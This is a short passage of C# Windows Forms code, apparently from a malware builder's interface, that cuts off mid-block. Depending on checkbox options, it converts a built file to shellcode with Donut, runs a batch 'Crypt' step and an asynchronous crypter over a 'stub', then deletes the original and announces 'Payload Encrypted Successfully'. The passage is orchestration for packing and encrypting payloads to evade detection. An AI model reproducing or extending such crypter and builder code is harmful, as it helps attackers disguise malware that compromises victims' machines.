                                {
                                    this.listBox2.Items.Add("Exporting bin...");
                                    Donut.Generate(saveFileDialog2.FileName, saveFileDialog2.FileName + ".bin");
                                }
                                if (this.chkBatch.Checked)
                                {
                                    while (!File.Exists(saveFileDialog2.FileName))
                                    {
                                        this.listBox2.Items.Add("Selected Batch output...");
                                    }
                                    this.Crypt(saveFileDialog2.FileName);
                                }
                                if (this.chkCrypter.Checked)
                                {
                                    while (!File.Exists(saveFileDialog2.FileName))
                                    {
                                        this.listBox2.Items.Add("Waiting for Encryption...");
                                    }
                                    Task.Run(async delegate
                                    {
                                        await this.CrpAsync(saveFileDialog2.FileName);
                                    }).Wait();
                                    this.listBox2.Items.Add("Stub encrypted...");
                                }
                                this.button1.Enabled = true;
                                if (this.chkCrypter.Checked)
                                {
                                    File.Delete(saveFileDialog2.FileName);
                                    MessageBox.Show("Payload Encrypted Successfully !Saved: " + Path.GetDirectoryName(Application.ExecutablePath), "Done !", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
